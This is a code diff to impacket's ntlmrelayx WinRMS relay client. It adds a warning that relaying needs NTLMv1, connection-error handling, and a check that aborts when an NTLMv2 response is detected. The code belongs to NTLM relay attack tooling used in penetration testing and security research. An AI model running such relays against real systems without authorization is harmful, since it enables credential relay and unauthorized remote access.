@@ -11,7 +11,7 @@ from struct import unpack
 from impacket import LOG
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
-from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN
 from impacket.spnego import SPNEGO_NegTokenResp
 
 PROTOCOL_CLIENT_CLASSES = ["WinRMSRelayClient"]
@@ -57,13 +57,23 @@ class WinRMSRelayClient(ProtocolClient):
         if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN:
             LOG.warning('The client requested signing, relaying to WinRMS might not work!')
 
+        # WinRMS relay only works with NTLMv1 (no Channel Binding support).
+        # NTLMv2 clients send CBT tokens that cannot be stripped, so relay will fail
+        # unless CbtHardeningLevel=None, NTLMv1 is enabled/downgraded, or MITM on WinRM.
+        # See: https://sensepost.com/blog/2025/is-tls-more-secure-the-winrms-case./
+        LOG.warning('WinRMS relay requires NTLMv1. NTLMv2 clients send Channel Binding tokens that will cause relay to fail')
+
         headers = {
             "Content-Length": len(self.basic_xml_data),
             "Content-Type": "application/soap+xml;charset=UTF-8"
         }
-        self.session.request("POST", self.path, headers=headers, body=self.basic_xml_data)
-        res = self.session.getresponse()
-        res.read()
+        try:
+            self.session.request("POST", self.path, headers=headers, body=self.basic_xml_data)
+            res = self.session.getresponse()
+            res.read()
+        except Exception as e:
+            LOG.error("Connection to %s:%s failed: %s" % (self.targetHost, self.targetPort, str(e)))
+            return False
 
         if res.status != 401:
             LOG.info(f"Status code returned: {res.status}. Authentication does not seem required for URL")
@@ -110,6 +120,21 @@ class WinRMSRelayClient(ProtocolClient):
             token = respToken2["ResponseToken"]
         else:
             token = authenticateMessageBlob
+
+        # Detect NTLMv2 and abort: WinRMS relay only works with NTLMv1.
+        # NTLMv1 NT response is exactly 24 bytes; NTLMv2 is longer.
+        try:
+            authMsg = NTLMAuthChallengeResponse()
+            authMsg.fromString(token)
+            ntlm_response_len = authMsg['ntlm_len']
+            if ntlm_response_len > 24:
+                LOG.error('NTLMv2 detected (NT response %d bytes). WinRMS relay requires NTLMv1. '
+                          'Relay will fail due to Channel Binding. Aborting.' % ntlm_response_len)
+                return None, STATUS_ACCESS_DENIED
+            else:
+                LOG.info('NTLMv1 detected (NT response %d bytes). WinRMS relay should work' % ntlm_response_len)
+        except Exception:
+            LOG.debug('Could not parse NTLM authenticate message to detect version, proceeding anyway')
 
         auth = base64.b64encode(token).decode("ascii")
         headers = {
